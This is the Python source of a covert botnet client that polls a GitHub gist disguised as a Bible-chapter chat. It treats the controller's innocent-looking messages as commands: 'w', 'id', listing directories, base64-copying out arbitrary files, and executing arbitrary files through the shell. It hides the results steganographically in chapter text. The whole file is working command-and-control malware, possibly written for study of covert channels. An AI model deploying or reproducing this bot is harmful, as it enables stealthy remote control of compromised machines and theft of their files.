import base64
import uuid
import sys
from time import sleep
from subprocess import check_output
from os import path

sys.path.append('..')
from common.utils import add_message, check_chat_file, get_last_messages, read_attachment
from common.utils import CONTROLLER_NICK_NAME
from common.gist import pull_gist, init_gist
from common.chapters import get_command_for_chapter, read_chapter
from common.steganography import encode_to_text, decode_from_text

SLEEP_TIME = 10
BOT_NICK_NAME = sys.argv[1] if len(sys.argv) > 1 else 'BIBLE'


def process_who():
    try:
        return check_output('w', shell=True).decode('utf-8').strip()
    except Exception:
        return 'Command "w" not found (probably Windows PC)'


def process_ls(dir_path):
    if path.exists(dir_path):
        return check_output(f'ls {dir_path}', shell=True).decode('utf-8').strip()
    return 'Directory does not exist'


def process_id():
    return check_output('id', shell=True).decode('utf-8').strip()


def process_cp(file_path):
    if path.exists(file_path):
        file = open(file_path, 'rb')
        data_binary = file.read()
        return base64.b64encode(data_binary).decode('ascii')
    return ''


def process_exec(file_path):
    if path.exists(file_path):
        try:
            return check_output(file_path, shell=True).decode('utf-8').strip()
        except Exception:
            try:
                return check_output(f'sh {file_path}', shell=True).decode('utf-8').strip()
            except Exception:
                return 'File cannot be run'
    return 'File does not exist'


def process_msg(sender, msg_id, msg, attachment):
    if len(msg) == 0 or sender != CONTROLLER_NICK_NAME:
        print('>>> Message is not a command', flush=True)
        return

    if msg == 'Tell me latest Bible news...':
        add_message('Bible is old, there are no news', BOT_NICK_NAME, reply_to=msg_id)
        print('>>> Heartbeat, bot is running', flush=True)

    elif msg.startswith('Send me text of chapter '):
        chapter_num = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
        cmd = get_command_for_chapter(chapter_num)

        if cmd == 'w':
            result = process_who()
            print(f'>>> w reply: {result}', flush=True)
        elif cmd == 'id':
            result = process_id()
            print(f'>>> id reply: {result}', flush=True)
        elif cmd == 'kill':
            return 'kill'
        else:
            print(f'>>> Invalid command: "{cmd}" without attachment', flush=True)
            return

        chapter = read_chapter(chapter_num)
        encoded, encoded_len = encode_to_text(result, chapter)
        attachment = {
            'name': str(uuid.uuid4()) + '.txt',
            'content': encoded[0:int(encoded_len*1.2)],
        }
        add_message('Text of the chapter is in the attachment', BOT_NICK_NAME, reply_to=msg_id, attachment=attachment)

    elif msg.startswith('Is this attachment part of chapter '):
        chapter_num = int(msg[35]) if msg[36] == '?' else int(msg[35:37])
        cmd = get_command_for_chapter(chapter_num)

        if attachment is None:
            print(f'>>> Invalid command: No attachment for "{cmd}"', flush=True)
            return

        text = read_attachment(attachment)
        decoded = decode_from_text(text)

        if cmd == 'ls':
            result = process_ls(decoded)
            print(f'>>> ls reply: {result}', flush=True)
        elif cmd == 'cp':
            result = process_cp(decoded)
            print(f'>>> cp reply: {result}', flush=True)
        elif cmd == 'exec':
            result = process_exec(decoded)
            print(f'>>> exec reply: {result}', flush=True)
        else:
            print(f'>>> Invalid command: "{cmd}" with attachment', flush=True)
            return

        chapter = read_chapter(chapter_num)
        encoded, encoded_len = encode_to_text(result, chapter)
        attachment = {
            'name': str(uuid.uuid4()) + '.txt',
            'content': encoded[0:int(encoded_len*1.2)],
        }
        add_message(
            f'No, it is not, I send the chapter {chapter_num} in the attachment',
            BOT_NICK_NAME, reply_to=msg_id, attachment=attachment
        )

    else:
        print(f'>>> Unknown command: "{msg}"', flush=True)
        return


def run():
    print('>>> Bot is starting...', flush=True)
    init_gist()
    max_msg_id = check_chat_file()
    print(f'>>> Bot is running as {BOT_NICK_NAME}...', flush=True)

    is_killed = False

    while not is_killed:
        sleep(SLEEP_TIME)
        pull_gist()
        new_max_msg_id = check_chat_file()

        if new_max_msg_id > max_msg_id:
            count = new_max_msg_id - max_msg_id
            print(f'>>> Processing {count} new messages...', flush=True)

            messages = get_last_messages(count)
            for (sender, msg_id, reply_id, attachment, msg) in messages:
                result = process_msg(sender, msg_id, msg, attachment)
                if result == 'kill':
                    print('>>> Killing the bot...')
                    is_killed = True
                    break

            max_msg_id = new_max_msg_id


if __name__ == '__main__':
    run()
